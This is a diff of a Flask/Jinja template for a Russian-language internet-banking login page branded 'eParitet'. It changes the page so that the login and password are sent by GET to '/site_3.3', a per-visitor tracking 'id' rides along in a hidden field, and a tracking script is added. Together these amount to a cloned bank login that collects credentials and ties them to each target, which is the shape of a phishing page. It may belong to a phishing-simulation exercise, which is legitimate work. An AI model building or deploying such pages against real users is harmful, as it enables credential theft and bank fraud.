@@ -4,7 +4,8 @@
 <head>
     <meta charset="UTF-8">
     <title>Вход в интернет-банк</title>
-    <link rel="stylesheet" href="D:\April\tracking_project\static\css\style_3.3.css">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style_3.3.css') }}">
+
 </head>
 
 <body>
@@ -24,13 +25,14 @@
     </div>
     <div class="login-box">
         <h2>Вход в eParitet</h2>
-        <form>
+        <form action="/site_3.3" method="get">
+            <input type="hidden" name="id" value="{{ request.args.get('id') }}">
             <label for="login">Логин</label>
-            <input type="text" id="login" name="login">
+            <input class="логин" type="text" id="login" name="login">
 
             <label for="password">Пароль</label>
             <div class="password-wrapper">
-                <input type="password" id="password" name="password">
+                <input class="пароль" type="password" id="password" name="password">
                 <span class="toggle-password">👁</span>
             </div>
 
@@ -40,6 +42,7 @@
             <button type="button" class="ecdsa-login">Войти по ЭЦП</button>
         </form>
     </div>
+    <script src="{{ url_for('static', filename='js/track_example_2.js') }}"></script>
 </body>
 
 </html>
